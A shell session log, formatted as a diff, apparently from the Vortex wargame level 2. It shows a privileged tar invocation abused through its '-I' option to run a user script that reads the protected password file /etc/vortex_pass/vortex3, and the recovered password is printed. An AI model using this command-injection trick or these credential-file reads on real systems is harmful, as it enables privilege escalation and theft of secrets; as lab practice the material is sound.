@@ -1,0 +1,10 @@
+ortex2@melinda:/vortex$ echo 'cat /etc/vortex_pass/vortex3 > /tmp/berne_vortex3' > /tmp/berne_vortex2.sh
+vortex2@melinda:/vortex$ chmod +x /tmp/berne_vortex2.sh
+vortex2@melinda:/vortex$ /tmp/berne_vortex2.sh
+cat: /etc/vortex_pass/vortex3: Permission denied
+vortex2@melinda:/vortex$ ./vortex2 vortex2 -I /tmp/berne_vortex2.sh
+/bin/tar: UW1\377VS\350\305\376\377\377\201\303u\033: Cannot stat: No such file or directory
+/bin/tar: Exiting with failure status due to previous errors
+vortex2@melinda:/vortex$ cat /tmp/berne_vortex3
+64ncXTvx#
+
